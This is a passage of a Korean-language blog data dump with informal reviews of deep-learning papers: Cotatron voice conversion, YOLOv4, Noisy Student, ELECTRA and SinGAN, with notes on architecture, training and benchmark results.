넣었다고 합니다.\n\n해당 encoder 구조는 2d cnn 6 layers + gru 구조로 구성.\n\n#### speaker disentanglement issue ?\n\n그래서 이런 speaker disentanglement 에 대한 issue 를 해결하기 위해 speaker classifier 를 추가로 붙여 줬다고 캅니다.\n\n이 때 사용된 모델은 간단한 1d cnn 4 layers + temporal max-pooling + fc 로 구성.\n\n### 2. voice conversion\n\n![img](voice-conversion-system.png)\n\n위 이미지처럼 voice-conversion system 인데, 전반적인 pipeline 이 그려져 있습니다.\n\n![img](residual_encoder_vc_decoder.png)\n\n#### 2.1 residual encoder\n\nspeech 를 decoding 하는 과정에서 아무리 transcription + speech 에 정보가 잘 있어도 speech 자체 만에 대한 정보도 다양하고 중요하여서,\n해당 정보를 따로 encoding 해서 decoder 에서 사용한다고 합니다.\n\nresidual encoder 의 특징은 \n\n* 위에 한 번 언급된 speaker encoder 와 비슷한 구조\n* temporal information 보존을 위해 time-wise 하게는 stride 적용 x\n* 특정 speaker feature 에 overfit 을 막기 위해 작은 channel size 를 사용. \n* 결론적으로 single channel output 이 위 문제를 막으면서 잘 동작했다고 캅니다.\n* plus) Hann 으로 smoothing 함 ($k = 21$)\n\n#### 2.2 VC decoder\n\n위에 image 처럼, Cotatron feature 와 mel encoded feature 가 concat 돼서 들어가고 target speaker id 도 같이 들어갑니다.\n\n> $M_{s \\to *} = Decoder_{vc} (concat(L_s, R_s), y^{id})$\n\nVC decoder 구조는 *GAN-TTS* 란 paper 와 유사합니다. head, tail 에 1d conv 가 1 layer 씩 있고, 중간에 GBlock w/ CondBN 4 blocks 있는 형태 입니다.\n물론 CondBN 에 Condition 으로 target speaker feature 가 들어갑니다.\n\n요 decoder 에 대한 모델적인 여러 시도를 했는데 결론적으로 성능 향상은 없었다고 하면서 future works 로 남기며 턴을 종료했습니다.\n\n### 3. training recipe\n\n은 논문 참고해 주세요 (~~귀찮~~)\n\n## Experiment Result\n\n### VCTK Benchmark (many-to-many)\n\n![img](vctk_benchmark.png)\n\n기존 SOTA 인 Blow 보다 훨 높은 MOS, DMOS 를 보여줍니다. SCA 는 Blow 를 넘진 못헀네요.\n\n### Speaker Disentanglement\n\n![img](degree_of_speaker_disentanglement.png)\n\n그냥 Cotatron feature 만 쓸 때와 mel spectogram 만 따로 encoding 해서 쓴 경우와 비교했을 때,\nSCA 가 훨씬 높은 걸 보여주네요.\n\n## Conclusion\n\n간단한 concept 으로 꽤괜 성능이 나오고,\ntranscript 를 주지 않아도 성능이 준 것과 comparable 하다는 점도 재밌고, \nCortatron encoder 를 다른 task 에 적용해 봐도 재밌는 결과 볼 수 있을 것 같네용\n\n결론 : 굳\n","excerpt":"TL;DR 최근 mindslab 에서 VC (Voice Conversion)관련 논문이 나와서 오랜만에 요 쪽 domain 도 볼 겸 해서 논문을 읽게 됐습니다. 간단하게 요약하면, 유명한 google 의 TTS model 인 tacotron2 기반…","fields":{"slug":"/Cotatron/"},"frontmatter":{"date":"May 10, 2020","title":"Cotatron Transcription-Guided Speech Encoder for Any-to-Many Voice Conversion without Parallel Data","tags":["Deep-Learning"],"update":"May 10, 2020"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이번에 리뷰할 논문은 오랜만에 나온 YOLO 4번째 버전인 YOLOv4 논문입니다.\n\n이번 버전은 이야기가 있는(?) 버전인데, YOLO 원 저자인 Joe Redmon 님 께서 올해 2월쯤에 twit으로 CV 연구를 그만하겠다고 선언하셨는데 (~~정말 YOLO 하러 가셨을까~~),\n과연 이번 버전엔 저자에 포함될지, darknet page에는 YOLOv4 가 올라갈지 이야기가 있었는데, 이번 저자로는 빠지셨고 ㅠㅠ darknet 에는 올라갔더라고요.\n\n쨋든, 요약하면 현재 SOTA 인 EfficientDet 과 비슷한 AP를 달성하면서 높은 FPS를 달성했네요.\n\npaper : [arXiv](https://arxiv.org/pdf/2004.10934.pdf)\ncode : [github](https://github.com/pjreddie/darknet)\n\n## Related Work\n\nYOLO 시리즈\n\n* YOLO v1 : [arXiv](https://arxiv.org/pdf/1506.02640.pdf)\n* YOLO v2 : [arXiv](https://arxiv.org/pdf/1612.08242.pdf)\n* YOLO v3 : [arXiv](https://pjreddie.com/media/files/papers/YOLOv3.pdf)\n\n## Introduction\n\n이번에도 논문에서는 speed를 추구한다고 강조를 하면서 \n\n0. 누구나 저렴한 GPU 장비로 학습 가능\n1. 빠른 operation 사용\n2. parallel computing 최적화 등등 \n\n여러 가지들을 고려했다고 합니다.\n\n총 2가지의 production serving 환경을 옵션을 들면서 설명하는데,\n\n### GPU\n\nconvolution layer 에서 작은 group 들 (1 ~ 8)을 사용했다고 카네요. CSPResNeXt50 / CSPDarknet53 \n\n### VPU\n\ngrouped-convolution 을 사용하고, SE Module 를 사용하지 않는다고 하네요.\n\n## Architecture\n\n크게 아키텍쳐를 설계하고 튜닝하는 것을 논문에선 3 부분으로 나눠서 설명합니다.\n\n1. 아키텍쳐 선정\n2. BoF, BoS (여러가지 augmentation, activation, layer)\n3. 기타 튜닝\n\n### Selection of Architecture\n\n이 논문에선 optimal 한 architecture 를 설계하기 위해 총 3가지의 balance 를 고려하는데요,\n\n1. resolution of input image\n2. num of layers\n3. num of parameters\n\nBackbone으로 사용할 network가 ImageNet classification task에선 좋은 성능을 보일진 몰라도\nObject Detection task에선 고려해야 할 점이 또 다르기 때문에, 띵킹을 해야 한다라는 점을 언급해요.\n\n예로는 CSPResNeXt50 가 CSPDarknet53 보다 ImageNet 에선 성능이 좋아도, MS COCO dataset 에서 Object Detection 에선\n반대라고 합니다.\n\n결론적으로 CSPResNeXt50 vs CSPDarknet53 vs EfficientNet-B3 을 backbone 으로 benchmark 결과\nCSPDarknet53 이 detector backbone 으로 사용하기 optimal 하다는 결론을 내립니다.\n\n![img](backbone-benchmark.png)\n\n또한 SSP Module 을 추가적으로 사용하고 (receptive field 때문에), PANet 을 feature aggregation 을 위해 사용한다고 합니다. (YOLOv3 에서 쓰던 FPN 대신 사용하는 거)\n\n최종적으로 아래와 같은 architecture 를 사용합니다.\n\n* `backbone` : CSPDarknet53 w/ SSP \n* `neck` : PANet (path-aggregation)\n* `head` : YOLOv3 (anchor-based)\n\n마지막으로 CGBN, SyncBN 같은 multi-gpu / TPU 환경같이 비싼 환경에서 사용하는 operation 들은 사용하지 않았다고 합니다. \n\n정말 누구나 훈련할 수 있다고 강조를 하네요 ㅋㅋㅋㅋ (~~그런데 1080ti, 2080ti 1개 도 없는 게 현실~~)\n\n### Selection of BoF and BoS\n\n여기선 모든 layer 들 loss, metric, augmentation 모든 기법을 나열하면서 괜춘한 걸 고르는 작업을 합니다.\n\n결론적으로 비싼 operation 들, 비싼 장비용 operation 들은 제외하고 누구나 써 볼 수 있는 operation 들을 고른 결과,\n\nregularization method 로 DropBlock 을 사용했답니다.\n\n### Additional improvements\n\n여기선,\n\n1. 새로운 augmentation 기법들과 SAT(Self-Adversarial Training)\n2. genetic algorithm 으로 hyper-parameter 튜닝\n3. 효율적인 훈련을 위해 디자인 변경 -> SAM, PAN module 들 수정, BN -> CmBN (Cross mini)\n\n#### 1\n\n결론적으로 기존 CutMix 는 2장의 이미지끼리 blend 하는데, Mosaic 은 4장의 이미지를 섞기 때문에 더 좋아서 (둘 다) 쓴다.\n(large mini-batch 사용을 안 해도 된다 등등의 이유)\n\nSAT 는 구글에 찾아보세요~ (~~귀찮~~)\n\n#### 3\n\nSAM 에서 spatial-wise attention 을 point-wise attention 으로 변경\nPAN 에서 shortcut 을 concat 으로 변경\n\n이유는 나와 있지 않은데, SAM 같은 경우엔 그 작은 parameter 몇 개 줄여보겠다는 의도인 것 같고,\nPAN 에 concat 은 성능 측면인 것 같네요. (뇌피셜)\n\n## Summary\n\n정리 함 다시 해 보면 \n\n### Architecture\n\n* `backbone` : CSPDarknet53 w/ SPP\n* `neck` : PAN\n* `head` : YOLOv3\n\n### Uses\n\n적용한 것들을 파트(?)별로 정리해 보면 아래와 같습니다.\n\n* Bag of Freebies (BoF) for backbone\n  * augmentation : CutMix, Mosaic\n  * regularization : DropBlock\n  * etc : class label smoothing\n* Bag of Specials (Bos) for backbone\n  * activation : Mish\n  * network : CSP, MiWRC\n* Bag of Freebies (BoF) for detector\n  * augmentation : Mosaic\n  * regularization : DropBlock\n  * loss : CIoU\n  * layer : CmBN\n  * lr scheduler : cosine annealing\n  * etc : SAT, eliminate grid sensitivity, multiple anchors for a single gt \n* Bag of Specials (Bos) for detector\n  * activation : Mish\n  * module : SPP, SAM, PAN\n  * loss : DIoU-NMS\n   \n## Experiment Result\n\n### Bof Benchmark\n\n위에 있는 모든 요소들을 benchmark 한 표.\n\n![img](bof-benchmark.png)\n\n### AP, FPS Benchmark\n\n각 GPU architecture 별로 AP, FPS benchmark 를 했는데, 아래 V100 (volta arch)에서 테스트한 결과.\n\n![img](ap-fps-benchmark.png)\n\n빠르네요\n\n## Conclusion\n\n이번 논문은 정말 모든 case 들을 하나하나 고려하려는 게 보였고, 설명도 최대한 low-level(?) 하게 하나하나 스킾하지 않고\n다 짚고 넘어가서 뭔가 투머치 같지만 좋았어요 \n\n또 정말 모든 부분 하나하나 튜닝한 점이 꽤 인상적이었어요. 온갖 힙한 것들도 사용하고.\n\n결론 : 굳굳\n","excerpt":"TL;DR 이번에 리뷰할 논문은 오랜만에 나온 YOLO 4번째 버전인 YOLOv4 논문입니다. 이번 버전은 이야기가 있는(?) 버전인데, YOLO 원 저자인 Joe Redmon 님 께서 올해 2월쯤에 twit으로 CV 연구를 그만하겠다고 선언하셨는데…","fields":{"slug":"/YOLOv4/"},"frontmatter":{"date":"Apr 26, 2020","title":"YOLOv4 Optimal Speed and Accuracy of Object Detection","tags":["Deep-Learning"],"update":"Apr 26, 2020"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이번 포스팅에서 리뷰할 논문은 EfficientNet 기반으로 새로운 techniques 를 적용해서 ImageNet dataset 에서 SOTA 를 찍은 논문입니다.\n나온지는 꽤 됐지만, 최근 TPU 에서 돌아가는 요 코드를 짜다가 생각나서 리뷰하게 됐어요.\n\n아래는 이번 approach 가 달성한 성능인데, 이전 SOTA 에 비해서 Accuracy 가 약 2% 정도 올라갔네요.\n\n해당 이미지에는 *L2* performance 가 안올라와 있는데, *Noisy Student + Random Augment* 로 훈련한 *L2* 모델 top-1 accuracy 가 *88.4%* 입니다.\n올해에는 90% 가 넘는 architecture 가 나오지 않을까 생각이 드네요.\n\n![img](performance.png)\n\npaper : [arXiv](https://arxiv.org/pdf/1911.04252.pdf)\n\ncode : [code](https://github.com/tensorflow/tpu/tree/master/models/official/efficientnet)\n\n## Related Work\n\nEfficientNet : [arXiv](https://arxiv.org/pdf/1905.11946.pdf)\n\n## Introduction\n\n이전 Image Classification 연구 동향들에서도 간단하게 설명은 다음에 다른 포스트로 다뤄볼께요. 양이 좀 많이 질 듯 해서 (~~귀찮네요~~)\n\n## Architecture\n\n### Self-Training w/ Noisy Student\n\n학습은 다음과 같은 process 로 이뤄지는데,\n\n![img](teacher-student.png)\n\n1. Labelled dataset 인 ImageNet 으로 **Teacher Model** 을 학습\n2. un-labelled dataset 인 JFT-300M 를 **Teacher Model** 로 pseudo labelling 하기\n3. `2` 에서 생성된 data + ImageNet 으로 **Student Model** 학습 w/ noise\n4.  다시 `2` 으로 가서 반복 (iterative training)\n\n위 과정이 knowledge (self) distillation 과 비슷한 과정인데, 주로 요 목적은 compression 으로 사용되는데, 여기는 \n해당 목적 (not compression) 으로 사용하지 않는다는게 차이점 입니다.\n\n### Training\n\n데이터 셋이나 구체적인 training recipe 들이 있지만, 적용한 technique 가 있어서 이걸 설명 해 보면,\n\n#### fix train-test resolution discrepancy\n\n처음 몇 epoch 은 low resolution image 로 훈련을 하고 후에 high resolution image 로 fine-tuning 하는 기법입니다.\n\n논문 실험에서는 처음 350 epochs 는 낮은 해상도 이미지로 훈련하고, 1.5 epochs 는 더 큰 해상도로 unlabelled image 에 대해서 훈련했다고 하네요.\n\nunlabelled image data 는 학습할 때 labelled image 보다 14 배 큰 batch size 를 사용했다고도 하네요.\n\n#### Iterative Training\n\n논문에서는 총 3 steps 의 iterative training 을 했다고 소개합니다.\n\n1. `EfficientNet-b7` 을 ImageNet 으로 훈련 `(as Teacher)`\n2. `EfficientNet-L2` 를 JFT-300M + ImageNet 으로 훈련 `(as Student)` (batch size 비율은 labelled : unlabelled = 1 : 14)\n3. `EfficientNet-L2` 를 새롭게 훈련 `2` 에서 만든 모델을 `Teacher` 로 사용 `(as Student)`\n4. `3` 과 비슷한 scheme 으로 진행하는데, (batch size 비율은 labelled : unlabelled = 1 : 28) 로 훈련\n\n#### Noisy\n\nStudent Model 을 학습할 때 논문에서 `Noisy` 하게 훈련한다고 했는데, 이 때 `Noisy` 에 해당하는 부분은 크게 3 부분 입니다.\n\n1. Data Augmentation w/ RandAugment\n2. Dropout\n3. Stochastic Depth\n4. other techniques (data filtering, balancing)\n  * OOD (Out-Of-Distribution)\n  * unlabelled data 에 대해선 class 별 samples 수가 biased 돼있으니, 적은 sample 들 duplicate 하기\n  * pseudo label 시, soft or hard pseudo 한다고 했었는데, soft, hard 둘다 좋은 결과를 보였지만, soft 가 더 좋았다\n\n요런 기법들은 이전에 소개된 기법들이니 설명은 pass\n\n## Experiment Result\n\n### ImageNet Benchmark\n\n역대 ImageNet architecture 들 정확도를 benchmark 한 table 인데, 다른 구조보다 \n\n1. 더 적은 params 수\n2. 상대적으로 적은 extra data 수\n3. 더 높은 성능\n\n을 달성했다는 점에서 의미가 있을 것 같네요.\n\n![img](overall-imagenet-performance.png)\n\n### Robustness Results on ImageNet-A, ImageNetC and ImageNet-P\n\n해당 dataset 은 이 모델이 정말로 noise 에 robust 한지 체크하는 task 입니다.\n\n예를 들어서, (일반적인 corruptions, perturbations)\n\n1. blur 섞인 이미지\n2. fogged 이미지\n3. rotated 이미지 \n4. scaled 이미지\n\n등등이 데이터에 섞여 있어요.\n\n![img](imagenet-a-benchmark.png)\n\nImageNet-A dataset benchmark table 만 하나 보면, 확실히 `The Noise` 가 robustness 에 큰 도움을 주고 있네요.\n\n### Adversarial Robustness\n\n이번 실험은 adversarial attack 에도 robust 한지 확인하는 겁니다. 주로 FGSM Attack 을 해서 테스트를 하는데, 성능은 아래와 같습니다.\n\n![img](fgsm-benchmark.png)\n\nFGSM 보다 더 강력한 attack 인 FGD Attack 시에도 꽤괜 성능을 보였다고 캅니다.\n\n## Conclusion\n\n요즘 경향들은 이전처럼 deep 한 architecture 를 설계하거나 AutoML 을 이용한 NAS 를 만드는 것 보다는,\ntraining recipe (~ techniques) 에 집중을 하고 있는데, 이런 trend 에서 재미있는 approach 들이 많이 나오고 있는 것 같네요.\n\n또 현재 상태에서 CutMix 등등 여러 또 다른 기술들이 적용되면 최고 performance 가 어느 정도 될지도 궁금해 지네요.\n\n결론 : 굳\n","excerpt":"TL;DR 이번 포스팅에서 리뷰할 논문은 EfficientNet 기반으로 새로운 techniques 를 적용해서 ImageNet dataset 에서 SOTA 를 찍은 논문입니다.\n나온지는 꽤 됐지만, 최근 TPU 에서 돌아가는 요 코드를 짜다가 생각…","fields":{"slug":"/Noisy-Student/"},"frontmatter":{"date":"Apr 11, 2020","title":"Self-training with Noisy Student improves ImageNet classification","tags":["Deep-Learning"],"update":"Apr 11, 2020"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이번에 리뷰할 논문은 *ELECTRA* 란 google ai 에서 3월에 발표한 논문인데, 재밌는 approach 를 하고 있어서 가져와 봤습니다.\n\nELECTRA paper : [OpenReview](https://openreview.net/pdf?id=r1xMH1BtvB)\n\ngoogle ai blog : [blog](https://ai.googleblog.com/2020/03/more-efficient-nlp-model-pre-training.html)\n\n## Related Work\n\n이전 trend 들 5 개 정도만...\n\nBERT : [paper](https://arxiv.org/pdf/1810.04805.pdf)\n\nXLNET : [paper](https://arxiv.org/pdf/1906.08237.pdf)\n\nRoBERTa : [paper](https://arxiv.org/pdf/1907.11692.pdf)\n\nALBERT : [paper](https://arxiv.org/pdf/1909.11942.pdf)\n\nT5 : [paper](https://arxiv.org/pdf/1910.10683.pdf)\n\n## Introduction\n\n간단하게 이번 *ELECTRA* paper 에서 이전과 다른 점 3 가지를 정리하면\n\n1. input 을 masking 하는게 아닌 generator 로 token 생성 (masking 효과)\n\n2. token ID 를 예측하는 게 아닌 discriminator 로 각 token 이 generated 됐는지 예측\n\n3. 기존 MLM 보다 더 좋음. (small MLM, ...)\n\n## Architecture\n\n### Previous Story\n\n이전 LM 들을 보면 DAE 형태로 학습을 하고 (masked input 을 복원), *BERT* 같은 경우에는 masking 때문에 example 당 token 의 15% 밖에 학습이 안돼서\n학습 비용이 꽤 컸어요.\n\n그래서 위 문제를 해결하려고 *ELECTRA*에서 replaced token detection task 를 제안했는데, \nmasking 하는 대신, 작은 MLM (masked language model ~ generator) 으로 생성된 output 으로 일부 교체 하고 discriminator 를 둬서 이게 replaced token or not 인지를 예측하게 학습했습니다.\n\n장점 으로는\n* MLM 자제가 작은걸 사용 -> 연산이 더 빨라짐\n* masked 된 부분만이 아닌 전체 token 에 대해서 discriminate -> 학습 효율 증가\n\n![img](disc_gen_overview.png)\n\n### Method\n\ngenerator / discriminator 로 GAN 과 유사해 보이는데, 해당 network 구조만 그렇고\n실제로 *adversarial* 하게 훈련하지는 않습니다.\n\n각 network encoder 는 transformer 로 구성되어있고,\n\ngenerator 는 각 token 에 대한 softmax 값을 output 로 주고\n\n> $p_G(x_t\\|x) = exp(e(x_t)^T h_G(x)_t) / \\sum_{\\dot{x}} exp(e(\\dot{x})^T h_G(x)_t$\n\ndiscriminator 는 각 token 에 대해 replaced / not replaced 를 예측합니다.\n\n> $D(x, t) = sigmoid(w^T h_D(x)_t)$\n\n### Model Extensions\n\n#### Weight Sharing\n\n* generator 하고 discriminator 크기가 같으면 weight sharing \n* 그런데 실험 결과로는 크기가 같지 않고 small generator 를 사용하는게 훨 좋았음\n* 그래서 small generator 를 사용하는 경우엔 token embedding table 만 weight sharing 을 함\n\n#### Small Generators (MLM)\n\n* generator / discriminator 크기가 같으면 기존 MLM 보다 2 배 커짐\n* 주로 generator 가 discriminator 크기의 x0.25 ~ x0.5 일 때 괜춘함\n* 간단한 uni-gram generator 도 시도를 해봄\n* adversarial 하게 훈련하는 건 discriminator 에게 꽤 challenging 한 일이여서, 실제 실험결과도 성능이 덜 좋음\n\n#### Training Algorithms\n\n1. 처음 n steps 는 generator 만 훈련\n2. generator weight 로 discriminator 초기화 -> generator freezing 후 discriminator 만 훈련\n\n### Small Models\n\n효과적으로 훈련하려고 아래와 같은 hyper-parameters 사용\n\n1. sequence length (512 -> 128)\n2. batch size (256 -> 128)\n3. hidden dims (768 -> 256)\n4. token embedding (768 -> 128)\n\n아래 Exp Result 에 결과첨부\n\n### Large Models\n\nBERT-large 와 똑같은 size, 하지만 training time 은 더 오래걸림.\n\nbatch size 는 2048, XLNET pre-training data 도 사용했다고 하네요. (RoBERTa 훈련할 때 사용한 데이터와 비슷)\n\n### Efficiency Analysis\n\n크게 3 가지인데\n\n1. ELECTRA 15% : discriminator loss 를 전체 token 이 아니라 masking 된 15% 에만 계산\n\n2. Replace MLM : 마스킹 할 token 을 `[MASK]` token 으로 replace 함\n\n3. All-Token MLM : 위에서 masking 된 token 을 predict, discriminator 에선 mask 에 대해서만 예측이 아닌 모든 token 에 대해 예측\n\n## Experiment Result\n\n### small models on the GLUE dev set\n\n![img](small_models_glue_dev_set.png)\n\n가성비 굳!\n\n### SQuAD\n\n![img](squad_benchmark.png)\n\n### Efficiency\n\n![img](efficiency_exp_glue_score.png)\n\n## Conclusion\n\n결론 : 굳\n","excerpt":"TL;DR 이번에 리뷰할 논문은 ELECTRA 란 google ai 에서 3월에 발표한 논문인데, 재밌는 approach 를 하고 있어서 가져와 봤습니다. ELECTRA paper : OpenReview google ai blog : blog Rel…","fields":{"slug":"/ELECTRA/"},"frontmatter":{"date":"Apr 11, 2020","title":"ELECTRA Pre-training Text Encoders as Discriminators Rather Than Generators","tags":["Deep-Learning"],"update":"Apr 11, 2020"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이번 포스팅에서는 ICCV 2019 에서 [Best Paper Awards](https://syncedreview.com/2019/10/29/iccv-2019-best-papers-announced/) 에서 선정된 papers 중에 하나인 **SinGAN** 을 리뷰해 보겠습니다.\n\n개인적으로 정말 재밌게 본 논문이고, ICCV 2019 논문들 중 최고였던거 같아요. 그래서 저도 간략한 overview 와 technical review 를 해 보려고 합니다.\n\n소개 전에 간단하게 SinGAN 으로 뭘 할 수 있는지 보면, **단 한 장의 이미지로 realistic 한 image manipulation 들을 생성**할 수 있어요.\n\n![img](teaser.png)\n\n![img](manipulation.png)\n\npaper : [arXiv](https://arxiv.org/pdf/1905.01164.pdf)\n\nofficial implementation : [code](https://github.com/tamarott/SinGAN)\n\n## Introduction\n\n기존 GAN 들을 대부분의 연구들을 보면 얼굴, 침실, 풍경 등 한 가지 종류에 focus 한 게 대부분이고, 주로 많은 데이터를 요구했습니다.\n\n다양한 종류의 object 를 생성하는 것은 여전히 잘 못하고 있고, 이런 문제를 해결할려고 conditional 하게 생성을 하거나 (e.g. cGAN), task 를 특정하는 등의 방법으로 문제를 해결하려 했습니다.\n\n왜냐면 이전 방법들로는 적은 수의 데이터와 여러 종류의 데이터의 distribution 을 잘 학습하기엔 엄청 어려웠어요\n\n그럼 이런 문제들을 어떻게 하면 해결할 수 있을까에서,\n\n> '단 1 장'의 이미지로 GAN 을 훈련할 수 있을까??\n\n이런 이번 논문인 **SinGAN** 이란 concept 이 나오게 됐습니다. (멋지죠?)\n\n물론 이전에 이런 노력을 안한건 아니에요. 정확히 논문 이름들은 기억이 안나는데, 대부분이 input 에 대해서 conditional 한 method 를 사용하고 있었습니다.\n\n또한 이전에 Unconditional Single Image GAN 이라고 하면 Texture Generation 이란 task 로 유일하게 문제를 풀고 있었는데, 이 task 의 한계는\ntexture image 에 대해선 결과가 reasonable 한데, non-texture image 에 대해서는 별로 였어요.\n\n하지만 이번에 소개할 논문에서는 \n\n* unconditional 하게, noise 로 부터 image 생성\n* general purpose 로 natural image target (non-texture) 에도 적용 가능한 방법 제안\n\n합니다.\n\n물론 결과는 이전 method 들 보다 훨씬 general 하고 결과도 outperform 합니다!\n\n## Technical Review\n\n**SinGAN** 에 소개된 novelty 를 1 가지로 요약 해 보면 아래와 같아요\n\n**Multi-Scale Architecture (# 2.1)**\n\n완전 새로운 concept 는 아니고, multi-scale architecture 에 대해서는 이전에 LAPGAN 이란 GAN 에서 한 번 비슷하게 소개가 되었는데,\n궁금하시면 한번 봐도 좋을 것 같습니다.\n\n### Multi Scale Architecture\n\nSinGAN 의 ultimate goal 이라고 하면, single image 의 internal distribution 을 잘 배우는 unconditional generative model 를 만드는 겁니다.\n\n이런 것을 하려면 다음과 같은 것들을 잘 해야 할텐데,\n\n* many different scales 로 복잡한 image structure 의 distribution 을 capture 하기\n    * global properties : 이미지 내 큰 objects 들의 모양과 배열 e.g.) 하늘 위치, 땅 위치\n    * local properties : global properties 의 details \n\n그래서 multi-scale architecture 를 선택했습니다.\n\n![img](multi-scale-architecture.png)\n\n위 그림에서 x_0 가 original training image 이고, x_1 ~ x_N 가 x_0 에서 r 배 (r > 1) 씩 down-sampled image 입니다.\n\n각 scale 에서...\n\n#### Generator\n\nnoise (z_n) 와 이전 단계에서 생성된 image (~x_n-1) 를 받아서 image (~x_n) 을 만듭니다.\n\n#### Discriminator\n\nreal image 와 (x_n) fake image (~x_n) 를 구분.\n\n하나 차이(?)점이 있다면, 맨 아래 scale stage 에서는 only noise (z_N) 를 사용해서 image 를 생성합니다.\n\n논문에서 coarse-to-fine fashion 이라고 소개를 하는데, 좀 쉽게 설명 해 보면,\n\n아래 단계에서는 down-sampled image 를 학습하니, 상대적으로 detail 보단 global 한 feature 에 집중을 하면서 학습을 하고,\n위 단계일 수록 fine feature 에 더욱 집중하게 됩니다. 동일한 receptive field 에 생성하는 image scale 이 다르니,\n위 그림에 **Effective Patch Size** 가 달라지면서 coarse-to-fine fashion 으로 학습이 된다 입니다.\n\n#### Single Scale Generation\n\n각 G_N 부분에 해당되는 block 인데, 구조는 아래와 같습니다.\n\n![img](single-scale-generation.png)\n\n% 이전 stage 에서 up-sampled image : x_n+1\n\n1. z_n + x_n+1 가 conv 연산을 통과\n2. x_n+1 가 residual 하게 마지막에 연결\n\n가 간단한 구조인데, conv block 부분을 더 자세하게 설명하면,\n\n``` Conv (3x3) - BatchNorm - LeakyReLU ``` \n\n이 convention 으로 5 층을 쌓았네요.\n\n처음 (coarsest scale) 엔 32 kernels / block 으로 시작을 하고 4 scales 마다 kernel 을 2 배 늘려 주었다고 합니다.\n\n이렇게 해 준 이유는 (상대적으로 light 한 구조여서), \n\n주로 generator 의 capacity 가 커지면 training image 를 외어버리는 경우가 생기는데, 이를 방지하려고 light 하게 설계를 한 것 같습니다.\n\n또한 fully-convolutional 하게 설계를 한 이유는, arbitrary image size 에도 training / inference 가 가능하게끔 하려고 라고 설명을 합니다.\n\n### GAN training\n\n이 부분이 이제 GAN을 학습하는데 있어서 제일 중요한 부분인데, 딱히 특별한 부분은 없습니다.\n\n#### loss function\n\nloss 는 adversarial loss + reconstruction loss 로 이뤄졌고\n\n```python\ntotal_loss = adv_loss + alpha * rec_loss\n```\n\n##### Adversarial loss\n\nWGAN-GP loss 사용 했고. 논문에 보면, 다른 texture single image GAN 과 다르게, patch 별이 아닌 전체 이미지에 대한 \nloss 를 사용했더니 네트워크가 boundary conditions (SM) 를 학습할 수 있었다고 합니다.\n\n#### Reconstruction loss\n\nl2 loss 를 사용. 각 stage 에서의 rec loss 를 다음과 같이 정의가 가능한데,\n```python\nrec_loss_n = l2_loss(G_n(0, (~x_n+1)), x_n)\n```\n또한 ~x_n 의 역할이 하나 더 있는데, stage n 에서의 noise z_n 에 대한 std 값을 결정하는데 쓰여요.\n~x_n+1 하고 x_n 의 RMSE 값을 구해서 각 scale 에 얼마만큼 더해야 하는지를 알려주는 정도로 사용된다고 합니다.\n\n또 중요한 부분은 noise 를 넣어줄 때, 첫 단계에만 fixed noise 로 넣어주고 다른 단계에서는 noise 를 따로 만들어 주지 않았는데,\nimage pixel difference 를 줄이려는 것에 focus 를 하려고 이렇게 했다고 캅니다.\n\n## Experiment Result\n\n### 정량적인\n\n총 2 가지의 정략적인 방법을 사용했는데,\n\n1. Amazon Mechanical Turk (AMT) \n2. Single Image Frechet Inception Distance (SIFID)\n\n요즘 GAN paper 들에서 자주 사용하는 metric 들입니다.\n\n#### AMT\n\nAMT 는 사람들에게 직접 답을 하게 해서 결과를 매기는 서비스입니다.\n여기서는 해당 이미지가 Fake 인지 Real 인지를 구별하게 하는 투표 방식을 사용했습니다.\n\n여기선 2 가지 방식으로 조사를 하였는데,\n\n1. 실제 이미지와 SinGAN 이 생성한 이미지를 보여주고 어느 쪽이 가짜인지 맞히는 Paired 실험\n2. 둘 중 하나만 보여주고 얼마나 헷갈렸는지를 물어보는 Unpaired 실험\n\n실험 조건은, 각 실험 당 1 초의 시간에 1 명당 50 장의 image 를 보여주었답니다.\n\n생성한 이미지는 stage N, N - 1 에서 생성한 이미지들을 주었다는데, (논문에선 N -2 까지)\n* stage N 은 noise 로 부터 생성한 이미지고\n* stage N - 1 은 진짜 이미지를 축소해서 G_N-1 에 넣어주는 방식인\n\n이런 실험에선 노이즈로 부터 생성할 때와 진짜 이미지 기반으로 생성할 때의 차이를 볼 수 있는데,\n\n![img](generate_from_different_scales.png)\n\n실험 결과를 보면, stage N, 노이즈로 부터 생성한 것은 원본과는 많이 다른 결과를 가져올 수 있고,\nstage N - 1, N - 2 는 원본 형태 유지는 되고, N - 2 같은 경우엔 texture 가 더 원본 같다는 것도 확인 할 수 있습니다.\n\n하지만, 원본 object 의 배열을 유지한 상태에서 다양성을 보장하기엔 stage N - 1 결과물이 제일 좋다고 판단이 가능하네요.\nAMT perceptual study 결과도 N - 1 stage 일 때가 가장 좋습니다.\n\n재밌는 점은 stage N - 1 일 때, **confusion 이 47 %** 인데, 사람이 보기에도 정말 헷갈리나 보네요.\n\n#### SIFID\n\n기존 FID 를 Single Image 에 맞게 변형해서 SIFID metric 을 제안해서 사용합니다.\n\n각 scale 별 SIFID 를 측정하고 AMT 에서 Survey 한 결과하고 (Paired, UnPaired) correlation 를 측정해서 유의미한 metric 임을 증명하네요.\n\n요 부분은 논문 6 ~ 7 페이지에 나와있는데, 여길 참고하세용 (~~귀찮아~~)\n\n### 정성적인\n\n총 5 개의 application 예시를 보여주고 있는데,\n\n#### Single Image Super Resolution (SISR)\n\n결과 비교를 위해 \ninternal method 인 Deep Image Prior (DIP), Zero-Shot Super Resolution (ZSSR)\nexternal method 인 SRGAN, EDSR 와 결과를 비교했습니다.\n\n![img](sisr_result.png)\n\n(distortion quality 인 RMSE 가 낮을 수록 좋고, Perceptual Quality 인 NIQE 가 높을 수록 좋음)\n\n다른 Internal Method 에 비해 RMSE 는 높지만, external method 인 SRGAN 과 NIQE 값은 comparable 합니다.\n\n1 장의 이미지만 사용해서 이 정도 결과라서 정말 신기하네. 개인적으론 PSNR 같은 다른 metric 하고 모델 들도 넣어줬으면 좋을 것 같네요.\n\n#### Paint-To-Image Style Transfer\nPaint Image 로 부터 생성하는 style transfer 실험인데, quality 가 꽤괜입니다.\n\n![img](paint_to_image_style_transfer_result.png)\n\n#### Editing\n\n원본 이미지에 일부 영역들을 임의의 무언가로 넣으면 이 친구가 얼마나 자연스럽게 만들어 주는지 확인 해 주는 task 인데,\n이것도 꽤 재밌는 결과를 보이네요.\n\n아래 이미지에서 *Content Aware Move* 가 포토샵 